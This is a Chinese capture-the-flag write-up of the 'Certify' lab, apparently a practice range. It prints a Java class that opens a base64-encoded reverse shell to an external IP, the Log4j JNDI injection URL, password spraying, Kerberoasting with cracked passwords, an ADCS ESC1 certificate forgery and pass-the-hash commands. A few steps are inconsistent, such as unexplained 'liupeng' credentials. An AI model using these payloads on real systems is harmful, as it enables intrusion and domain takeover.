---
tags: [Log4j2, JNDI注入, RCE]
---

# 春秋云境Certify靶场

## flag01

首先用fscan扫描

![屏幕截图 2026-01-22 152606](D:\Pictures\certify\屏幕截图 2026-01-22 152606.png)

发现solr，并且使用了log4j插件

参考[log4j2远程代码执行漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_log4j漏洞复现-CSDN博客](https://blog.csdn.net/Bossfrank/article/details/130148819)

编写恶意类

```
import java.lang.Runtime;
import java.lang.Process;
public class Exploit {
     public Exploit(){
             try{
                 Runtime.getRuntime().exec("/bin/bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvNDcuMTA5LjE1Ny41NC8xMzM3IDA+JjE=}|{base64,-d}|{bash,-i}");
                                }catch(Exception e){
                                            e.printStackTrace();
                                             }
                }
         public static void main(String[] argv){
                         Exploit e = new Exploit();
                            }
}
```

编码为.class文件 javac Exploit.java,放在http服务目录下（8000端口）

![屏幕截图 2026-01-22 163713](D:\Pictures\certify\屏幕截图 2026-01-22 163713.png)

然后再启用LDAP服务器

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://47.109.157.54:8000/#Exploit" 1389
```

![屏幕截图 2026-01-22 163657](D:\Pictures\certify\屏幕截图 2026-01-22 163657.png)

监听1337端口

访问

```
http://39.99.144.221:8983/solr/admin/cores?action=${jndi:ldap://47.109.157.54:1389/Exploit}
```

显示![屏幕截图 2026-01-22 163730](D:\Pictures\certify\屏幕截图 2026-01-22 163730.png)

弹到shell，但不是root权限

```
sudo -l
```

发现有一个sudo权限运行的文件

![屏幕截图 2026-01-22 163816](D:\Pictures\certify\屏幕截图 2026-01-22 163816.png)

进行提权启用一个新的窗口，在root目录下发现flag01

![屏幕截图 2026-01-22 163856](D:\Pictures\certify\屏幕截图 2026-01-22 163856.png)

## flag02

继续用开始的http服务，wget获取fscan和frpc，扫内网搭建隧道

```
./fscan -h 172.22.9.0/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.9.19     is alive
(icmp) Target 172.22.9.7      is alive
(icmp) Target 172.22.9.47     is alive
(icmp) Target 172.22.9.26     is alive
[*] Icmp alive hosts len is: 4
172.22.9.47:21 open
172.22.9.47:445 open
172.22.9.26:445 open
172.22.9.7:445 open
172.22.9.26:139 open
172.22.9.7:139 open
172.22.9.47:139 open
172.22.9.26:135 open
172.22.9.7:135 open
172.22.9.7:80 open
172.22.9.47:80 open
172.22.9.47:22 open
172.22.9.19:80 open
172.22.9.7:88 open
172.22.9.19:22 open
172.22.9.19:8983 open
[*] alive ports len is: 16
start vulscan
[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!
[*] NetInfo 
[*]172.22.9.7
   [->]XIAORANG-DC
   [->]172.22.9.7
[*] NetInfo 
[*]172.22.9.26
   [->]DESKTOP-CBKTVMO
   [->]172.22.9.26
[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
[*] NetBios 172.22.9.7      [+] DC:XIAORANG\XIAORANG-DC    
[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393
[*] NetBios 172.22.9.47     fileserver                          Windows 6.1
[*] OsInfo 172.22.9.47  (Windows 6.1)
[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server
[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/
[+] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect 
[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin

```

发现了

```
NetBIOS (Network Basic Input/Output System) 是Windows网络共享的核心协议
fileserver 这个NetBIOS名称直接表明它是文件服务器
```

访问共享文件

```
smbclient -L 172.22.9.47   
```

![屏幕截图 2026-01-22 170348](D:\Pictures\certify\屏幕截图 2026-01-22 170348.png)

访问fileshare

```
smbclient //172.22.9.47/fileshare
```

接着访问里面的secret文件夹

![屏幕截图 2026-01-22 170819](D:\Pictures\certify\屏幕截图 2026-01-22 170819.png)

可以使用get指令直接下载或者使用more直接查看flag02

![屏幕截图 2026-01-22 170711](D:\Pictures\certify\屏幕截图 2026-01-22 170711.png)

## flag03

下载里面的personnel.db 文件，从kali里拿到windows用navicat打开，建立一个sqlite连接

可以看见有分开的用户名文件和密码文件

![image-20260122191324944](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20260122191324944.png)

![image-20260122191359584](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20260122191359584.png)

分别保存为user.txt和password.txt，进行密码喷洒

```
crackmapexec smb 172.22.9.26 -u user.txt -p password.txt
```

成功爆出

```
SMB         172.22.9.26     445    DESKTOP-CBKTVMO  [+] xiaorang.lab\zhangjian:i9XDE02pLVf 
```

尝试进行rdp发现不成功，结合flag02关于spn的提示，使用**Kerberoasting 攻击**

**Kerberoasting** 是一种针对 **Active Directory（AD）域环境** 的权限提升攻击技术，其核心思想是：

> **利用任何普通域用户权限，请求服务票据（Service Ticket, ST），然后离线暴力破解该票据，以获取高权限服务账户的明文密码。**
>
> ### **攻击前提：**
>
> - 攻击者拥有一个**有效的域用户凭据**（如你命令中的 `zhangjian:i9XDE02pLVf`）。
> - 域中存在**以普通用户账户（而非机器账户）运行的服务**，且这些账户注册了 **SPN（Service Principal Name）**。
> - 服务账户使用 **弱密码**

```
impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf
```

成功获取到ST票据，保存到1.txt进行暴力破解

```
hashcat -m 13100 1.txt /usr/share/wordlists/rockyou.txt
```

```
$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$9b54568cc49018ea30f371f2c663f19f$28dcb42d7a76dc4b05fb99b0fe1821404a461a904cbc2c5fcb91cbb268f2fa3e92323544fc2fe4a61f9ed3ddcdb0cb66b9f0b6f6baf077757b1bd0f26ab05eee9fa5de846dc71bcd4c53c3deff0a47c89bfb2e58a3ae4a8d0c0cca9d819462d183845983a6120fc4cb0387b184a697d1518c6ff679b16c57b593d963b1eee505d22bf296983f59f49e5c4b7cab617d045a844428f44fb3f4830f29e32dbd919b40414526b1f2ed39804a8ec90be8e7d34a0ca379f1a16c1bf871340839d9cf0fc7072ae728b2dd4baa327e6b10352dc0020c63779ab3235476d8f7418940f006f9b9f383c121c22ad984d1910fc7389d4040b816f38f70c9c2297e9e75ad72c0a06ad3f9ca45b52eb2502ded81ceda387d8d1bb9ede2a01620181dadcd75db68378e83cec9eac4226f0dc89de1c408a046e2cdf650f2beb6524905215b57f61a509907902b5986807646f918b79291635eecca16b5d5743f944952e0682a6b8b3509055763a56f1375ccffe984bc7076a8e6ad0d8dd875da5558a95653c63c8b8889807ed474c457a4f1bfa489217f904c9ab59d849e0aadc53db604db28c8a8e8d04051e57cd19c81e2ae5f91eae74a6c250859a21ae898affe78445db83ea82e2dfd858a04d47d6bd669971e61de72d13a27745ee036bf1c27aabf756e996acda2031769ccbb0d67e1dace9b2c6480d83724039066585cd973b768ca170dc05fa21cf057687a2bf34aa62175a1b2cfba9e27b74a11e656001e21bde5bcd65b36f76405adfb5c8983ecba128067e5f42bf8fbe9aec8e64c63222551a72b4a67ec9861d93a0c48071630e3508608255d6e8a2098e4cb932b4a4e703093f4503474ceb95fad9532fb922203f27a5bc66128ea6dd8325dd9bef8df7800229ce3e8c2d0f8dcfc7568334c1c7cc2b8ea74ada8378ad3703d1a969cd3fa43d69466dd28881ff5fbed295c94a6e7848ae389134f0fc7737f46de0bc211203a1c7bb947ae4fa8fd9f3d6e961b3de6a99e5629fb20c4a2fec2af7d37ec193de219e673b01640253e7b0b50bd58ae20fa1a2fd38b45465e45eee123b629dbb1b595f26da18d584255b912d2f174d31b0389d59360004ebcf84b457012be790c709f219bf352b995af10fb9865142e86c89d43178f80563d6c2e92a168cd77e64101b785ff55bb07382c719fcc1febe6c4c36f87f984b5381f8a0ce4128fec8337fa98d65e5bb9c83eb8305783d1ed02f4bf6cbc70f2d441ea3694432d3bb3baf8d7242080d14679bad73f4421f5cfc4117e16a5febfc871105099d0b53060dcc850dcd6d1562aa98aebb3677a0558e1abbeef32129ad81d71faeddee097349750099f52bd2686b4fa072fbb74f2f99a97d8cd91e7f8cd60c6c8c50b2de2e70dc10ffab94180dc12754421c7e44a0ad1c23b83411f9290fab73c805a4bd7932cca5e43bd5c0834350ef11d95f2a0ad24a4e30e3bec3aa8aad7db96a97e1d9a2d4744b0474c09ef2b43c02e53a352f4e4de5f3c:MyPass2@@6
$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$35b4c2bbe3a25d09388146c4dc95f6b0$14f5ff405ffd781c820e0acd3b98b5d92f3c39c0e6454e4f821cb3a804b86c2e6f37b38f95e989fc0a21f34c4d5cd8b28542c09c178826d9eadb59f89a7b0eb0f08de86661ed662020a1c682ed216142c10732ba83ca051c9544fa6ef0d203a66c2e6d91a122a5c36dec109b907f36a8d3c49fd289d345464a956b25474d513f86e0aeaad5c6a2f07b927e8b7ae547716cea463f9dd7152de10ef17c9367a85452c8c3f112c354a146e60bfd4bdf75f46d8f1cee2ee78bab1216120662b8c482f53e1dc77622169212e594fc48d2505ad630cecf761e0a65990f7246021f10f536e7432cd138ed6676519a844d5fbb35060b274d7950506ad4106ae592dff2477b93000c5d33338a42256480f4c48f1a1d783191436452ad9925b9908160b48b49c634e91039bea970251400a7a02253323936742d5f10ad98bcb47772e790462aad88f454d79dc190aaf6fddf31ff0b93963858594d5c27776ae98586c694c13cb68e1fe24e738dd06a312cf6a8dcfb26d4d2f1246e1a6c02deb3c40577cd9e7763e11a29c5c486d249076ee07b8d7a8ace964873880329fa94efd14739c56607da082ef74683db70ddfccd983c03769af9244583d5b98a2f426a8f06e8dff4e67ad311ba72e6745d9de6089d0054564f3e78594188781d85622d2b93130f84ed5e8ff9965ad9d6213b1eabde6097d99b11b8df19aaa413ca13475b8be49cbdcc3a4aed5602cbef2195ca63904187a16e03607438f7818bf0ea0baa0270257b0a7309c2592e85e6511bdd2d7c3e93a82034c94b2be32f0933b34ac19b638acbcc51a254d902f85ce9684145ae392d8e3eb27c04d405e16426595ff5dc38b3678beac74426c24ee637e30d9845db2deb25f2b734f09ae67539bf7254fb1a9e7bec151b48c2637c486fd259de362ef3a80f840799cdb07ed75ddbedb6c9aeaa92f4ff3858e7ac5fce664ccb64d30b39f06b4b60346ebf469d612a78d5d7d02c56aa724a7b7077b6b92e2facf487fcff356f1dcdf2fc4337fb6274e772157888f9c73521ed4825168101cf46ddcea8352c4ab168c0ac578347ce773be4cc7fda58ccc36717789d2ff590728ac1d70f86b5c57630672b87cb7e27dd4b2f20d3174886d90deac70969aa21d6ff6a1231afa75952118fa4676ad69361b88904eb4d39fc212486c908455e184aebe666543046b60d37f9d78f2143cdf84e7d1d3dd9f8c692871e0ed4ca3e51b9af0b5747ebd1cff79097763aa9db98a6a2ce6f737c6a6b3d587056094631e316756143a498b81865c72ad2c7b39b1fbb6bf967aebba99be5686d96d5438efe3c38abe54b9fdae67386f925b7d8ee6d8d0fa67aeb80cccc1e9d8f7d23a53dfb7780c0e54c1bff9e4d9c7ed513ff8fe3a90a4a956107b3f05b6a2ca828e959c85a2b98d683aecf8a98a5de576e31f807b580daad7898ea083644fb941f15aba407aeff3423ef01f798fed62686f473e4df3a94d30ec28eba44067899ca52cc3fc0efe1688e:@Passw0rd@

```

结果为

zhangxia：MyPass2@@6

chenchen：@Passw0rd@

然后远程桌面连接，这里我是用windows自带的和rdesktop失败（目标 Windows 主机 **启用了 NLA（Network Level Authentication，网络级认证）**，而 `rdesktop` **不支持 NLA**）

```
xfreerdp3 /v:172.22.9.26 /u:zhangxia /p:'MyPass2@@6' /cert:ignore +clipboard /dynamic-resolution
```

成功远程桌面登录，但是仍然没有权限查看administrator用户文件

因为fscan扫出来有CA服务器可以尝试adcs攻击

```
certipy find -u 'zhangxia@xiaorang.lab'  -password 'MyPass2@@6' -dc-ip 172.22.9.7 -vulnerable -stdout
```

扫描结果

```
Certificate Authorities
  0
    CA Name                             : xiaorang-XIAORANG-DC-CA
    DNS Name                            : XIAORANG-DC.xiaorang.lab
    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab
    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5
    Certificate Validity Start          : 2023-07-14 04:33:21+00:00
    Certificate Validity End            : 2028-07-14 04:43:21+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Unknown
    Request Disposition                 : Unknown
    Enforce Encryption for Requests     : Unknown
    Active Policy                       : Unknown
    Disabled Extensions                 : Unknown
Certificate Templates
  0
    Template Name                       : XR Manager
    Display Name                        : XR Manager
    Certificate Authorities             : xiaorang-XIAORANG-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-07-14T04:51:15+00:00
    Template Last Modified              : 2023-07-14T04:51:44+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Domain Users
                                          XIAORANG.LAB\Enterprise Admins
                                          XIAORANG.LAB\Authenticated Users
      Object Control Permissions
        Owner                           : XIAORANG.LAB\Administrator
        Full Control Principals         : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
        Write Owner Principals          : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
        Write Dacl Principals           : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Enterprise Admins
        Write Property Enroll           : XIAORANG.LAB\Domain Admins
                                          XIAORANG.LAB\Domain Users
                                          XIAORANG.LAB\Enterprise Admins
    [+] User Enrollable Principals      : XIAORANG.LAB\Authenticated Users
                                          XIAORANG.LAB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

存在ESC1

**伪造域管理员证书**

```
certipy req -u 'liupeng@xiaorang.lab' -p 'fiAzGwEMgTY' -target 172.22.9.7 -dc-ip 172.22.9.7 -ca "xiaorang-XIAORANG-DC-CA" -template 'XR Manager'  -upn administrator@xiaorang.lab 
```

**获取域管哈希**

```
certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7
```

![屏幕截图 2026-01-22 182001](D:\Pictures\certify\屏幕截图 2026-01-22 182001.png)

最后就可以进行哈希传递拿下域环境

```
crackmapexec smb 172.22.9.26 \
  -u 'administrator' \
  -H 'aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80' \
  -d 'xiaorang.lab' \
  -x 'type C:\Users\Administrator\flag\flag03.txt'
```

![屏幕截图 2026-01-22 182510](D:\Pictures\certify\屏幕截图 2026-01-22 182510.png)

## flag04

哈希传递至域控即可

crackmapexec smb 172.22.9.7 \
  -u 'administrator' \
  -H 'aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80' \
  -d 'xiaorang.lab' \
  -x 'type C:\Users\Administrator\flag\flag03.txt'

![image-20260122193801615](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20260122193801615.png)